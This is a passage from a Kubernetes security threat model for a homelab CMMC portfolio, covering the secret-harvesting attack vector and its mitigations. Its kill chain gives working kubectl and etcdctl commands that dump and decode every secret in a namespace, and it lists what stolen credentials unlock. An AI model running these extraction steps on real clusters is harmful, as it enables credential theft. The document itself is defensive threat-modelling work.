**Impact: HIGH | Likelihood: HIGH | Overall: HIGH**

### Why This Vector Is Ranked #5

Secret harvesting is ranked #5 not because it is less dangerous than the others — the credentials in a production Kubernetes cluster can unlock everything from cloud provider accounts to database root access — but because unlike vectors 1–4, it does not by itself constitute a full cluster compromise. It is instead the *enabler* for lateral movement into adjacent systems. It is also the highest-likelihood vector: the attack requires only basic RBAC access to a namespace, and the tooling (`kubectl get secrets -o yaml`) is part of the standard Kubernetes CLI.

Kubernetes Secrets are a particularly soft target because: (1) developers routinely over-scope ServiceAccount RBAC to include `get secrets`, (2) secrets mounted as environment variables expose credential values in `kubectl describe` output, and (3) secrets at rest in etcd are base64-encoded by default — not encrypted.

### Kill Chain

```
Step 1: Gain Any Cluster Access
  Attacker needs any authenticated principal:
    - Compromised developer kubeconfig
    - ServiceAccount token from a running pod (via app exploit)
    - Leaked CI/CD variable (overlap with Vector 2)

Step 2: Enumerate Secret Inventory
  kubectl get secrets --all-namespaces
  # Lists all secrets the principal can see
  # Even if they can't READ values, names reveal what exists:
  #   prod-aws-creds, db-root-password, gitlab-runner-token...

Step 3: Enumerate RBAC to Find Over-Permissioned Accounts
  kubectl auth can-i get secrets -n production
  kubectl auth can-i list secrets --all-namespaces
  # Find any serviceaccount or role with list/get on secrets

Step 4: Mass Secret Extraction
  # If principal has list + get:
  kubectl get secrets -n production -o json \
    | jq '.items[] | {name: .metadata.name,
                       data: (.data | map_values(@base64d))}'
  # All secrets in the namespace in plaintext

  # Alternatively, via etcd if vector 1 has been completed:
  etcdctl get /registry/secrets/production --prefix \
    | grep -A5 "stringData"

Step 5: Leverage Extracted Credentials
  AWS credentials  → cloud resource access, S3 data exfiltration
  DB passwords     → direct database access, data theft
  TLS private keys → MITM attacks on TLS-protected services
  GitLab tokens    → source code access, pipeline manipulation
  Registry tokens  → pull proprietary images, push malicious images
  Splunk HEC token → log injection (overlap with T-7.2)
  AWX token        → trigger Ansible playbooks (overlap with E-6.1)
```

### Threat IDs

| ID | Description |
|---|---|
| [I-1.1](threat-model.md#i----information-disclosure) | Secret enumeration via over-privileged list/get |
| [I-2.1](threat-model.md#i----information-disclosure-1) | Secrets stored at rest without encryption |
| [I-11.1](threat-model.md#i----information-disclosure-10) | Secrets mounted as environment variables widely leakable |
| [I-11.2](threat-model.md#i----information-disclosure-10) | Application logging captures secret values |
| [I-8.1](threat-model.md#i----information-disclosure-7) | Credentials embedded in image layers |

### Mitigating Controls

**M5.1 — Remove `list` and `get` on Secrets from All Non-System ServiceAccounts**

The single most impactful control for this vector. Most application workloads do not need to list all secrets in their namespace — they need specific secrets mounted as volumes. Audit every Role and ClusterRole that grants `list secrets` or `get secrets` and replace them with volume-mounted secrets or Vault dynamic credentials.

```bash
# Find all roles with secret list/get permissions
kubectl get roles,clusterroles -A -o json \
  | jq '.items[] | select(
      .rules[]? |
      (.resources[]? == "secrets") and
      (.verbs[]? | IN("get","list","watch","*"))
    ) | .metadata.name'

# Replace with Vault integration or mounted volumes:
# Before: envFrom: secretRef: name=db-credentials
# After:  volume mount + Vault agent sidecar
```

*Addresses:* [I-1.1](threat-model.md#i----information-disclosure), [I-11.1](threat-model.md#i----information-disclosure-10) | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**M5.2 — Mount Secrets as Volumes, Not Environment Variables**

Environment variables are universally visible: in `kubectl describe pod`, in `/proc/<pid>/environ` after a container escape, and in application crash dumps. Volume-mounted secrets are accessible only to the process that reads the file, and only at the specific path mounted.

```yaml
# INSECURE — visible in kubectl describe, /proc/*/environ
env:
- name: DB_PASSWORD
  valueFrom:
    secretKeyRef:
      name: db-credentials
      key: password

# SECURE — accessible only via filesystem read
volumes:
- name: db-credentials
  secret:
    secretName: db-credentials
    defaultMode: 0400  # read-only, owner only
volumeMounts:
- name: db-credentials
  mountPath: /run/secrets/db
  readOnly: true
```

*Addresses:* [I-11.1](threat-model.md#i----information-disclosure-10), [I-11.2](threat-model.md#i----information-disclosure-10) | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

**M5.3 — Deploy Vault for Dynamic, Short-Lived Credentials**

Replace static long-lived credentials stored as Kubernetes Secrets with Vault-issued dynamic credentials. Database passwords, AWS access keys, and API tokens are generated on-demand for each workload with a short TTL (hours, not months). A harvested credential expires before an attacker can reuse it.

```hcl
# Vault policy: app-db-policy
path "database/creds/app-role" {
  capabilities = ["read"]
}
# TTL: 1h, max_ttl: 24h
# Credential is unique per pod instance, auto-rotated
```

```yaml
# Vault Agent sidecar injects credentials at pod startup:
# annotations:
#   vault.hashicorp.com/agent-inject: "true"
#   vault.hashicorp.com/role: "app-role"
#   vault.hashicorp.com/agent-inject-secret-db: "database/creds/app-role"
```

*Addresses:* [I-1.1](threat-model.md#i----information-disclosure), [I-2.1](threat-model.md#i----information-disclosure-1) | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.2](cmmc-mapping.md#ia-352--authenticate-devices)

---

**M5.4 — Run `k8s_secret_auditor.py` Daily; Alert on Anomalies**

The `k8s_secret_auditor.py` script (Phase 11.3) implements 15 detection rules specifically targeting secret harvesting patterns. Alert on `BURST_ACCESS` (rapid sequential reads), `MASS_LIST` (cluster-wide listing), `LIST_ENUMERATE` (list then targeted get), and `SENSITIVE_NAME` (access to high-value credential names).

```bash
# Daily cron at 04:00
python3 /usr/local/bin/k8s_secret_auditor.py \
  --log /var/log/kubernetes/audit/audit.log \
  --output-json /var/log/k8s_secret_audit.json \
  --output-html /var/www/html/reports/secret_audit.html
# Exit 2 = CRITICAL findings → trigger immediate Splunk alert

# Splunk saved search for real-time monitoring:
# index=k8s_audit resource=secrets verb IN (get,list) |
# stats count by user.username, namespace | where count > 10
```

*Addresses:* [I-1.1](threat-model.md#i----information-disclosure) | *NIST:* [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use), [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records)

---

**M5.5 — Encrypt All Secrets at Rest in etcd**

Even if an attacker lists secrets via the Kubernetes API or reads etcd data directly, encrypted-at-rest secrets require the kube-apiserver's encryption key to decrypt. Combined with M5.1 (RBAC restriction), this creates defense-in-depth: two independent controls must both fail before plaintext credentials are accessible.

This control is shared with Vector 1 (M1.1) — it addresses both the direct etcd access path and the over-permissioned API access path.

*Addresses:* [I-2.1](threat-model.md#i----information-disclosure-1) | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui)

---

### Residual Risk After Controls

RBAC restriction + volume mounts + Vault dynamic credentials substantially eliminates the static credential harvesting surface. Residual risk is an attacker who compromises a principal at exactly the moment it holds a valid Vault-issued short-lived credential — a narrow window compared to static secrets that never expire. This residual is accepted and documented.

---

## Control Coverage Summary

The following NIST 800-171 controls are exercised across all five attack vectors. Each links to its full implementation detail in `cmmc-mapping.md`.

| NIST Control | Vectors Addressed | Controls Count |
|---|---|---|
| [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users) | 1, 2, 3, 4, 5 | 5 mitigations |
| [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms) | 1, 2, 4, 5 | 7 mitigations |
| [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes) | 2, 3 | 3 mitigations |
| [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use) | 1, 3, 4, 5 | 4 mitigations |
| [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records) | 1, 3, 4, 5 | 4 mitigations |
| [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users) | 4 | 2 mitigations |
| [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication) | 2, 4, 5 | 3 mitigations |
| [SA-3.12.1](cmmc-mapping.md#sa-3121--monitor-and-protect-against-supply-chain-risk) | 2 | 2 mitigations |
| [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes) | 2, 3 | 3 mitigations |
| [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui) | 1, 5 | 2 mitigations |
| [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks) | 3, 4 | 2 mitigations |
| [IA-3.5.2](cmmc-mapping.md#ia-352--authenticate-devices) | 2, 5 | 2 mitigations |
| [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries) | 1 | 1 mitigation |
| [SC-3.13.10](cmmc-mapping.md#sc-31310--establish-and-manage-cryptographic-keys) | 1 | 1 mitigation |
| [IA-3.5.7](cmmc-mapping.md#ia-357--enforce-password-complexity) | 4 | 1 mitigation |
| [CM-3.4.1](cmmc-mapping.md#cm-341--establish-baseline-configurations) | 2 | 1 mitigation |
| [SI-3.14.1](cmmc-mapping.md#si-3141--identify-and-manage-information-system-flaws) | 2 | 1 mitigation |
| [AC-3.1.2](cmmc-mapping.md#ac-312--limit-system-access-to-authorized-transaction-types) | 2 | 1 mitigation |
| [AC-3.1.3](cmmc-mapping.md#ac-313--control-flow-of-cui) | 4 | 1 mitigation |

---

## Document History

| Version | Date | Author | Changes |
|---|---|---|---|
| 1.0 | 2026-03-02 | Jason A. Slocomb | Initial release — five attack vectors with full kill chains, 25 mitigating controls, NIST 800-171 mappings |

---

*This document is part of the homelab Kubernetes security engineering portfolio demonstrating CMMC Level 2 compliance architecture. Attack vector rankings and kill chains are based on the STRIDE threat analysis in [`docs/threat-model.md`](threat-model.md). All NIST 800-171 control references link to implementation evidence in [`docs/cmmc-mapping.md`](cmmc-mapping.md).*
